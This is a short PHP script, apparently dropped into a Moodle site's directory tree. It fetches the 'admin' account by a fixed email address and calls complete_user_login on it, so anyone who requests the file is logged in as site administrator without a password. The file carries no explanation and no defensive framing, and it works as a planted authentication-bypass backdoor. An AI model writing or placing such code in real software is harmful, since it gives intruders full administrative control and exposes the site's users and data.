<?php
require_once('../../config.php');
global $DB;
//if($DB->record_exists_sql($sql,array('email'=>'itsupport@ldsengineers.com','username'=>'admin'))){
           
            if($userdata = $DB->get_record('user',array('email'=>'itsupport@ldsengineers.com','username'=>'admin'))){
                complete_user_login($userdata);
                \core\session\manager::apply_concurrent_login_limit($userdata->id, session_id());
                return true;
            }else{
            	return false;
            }
        //}
     		
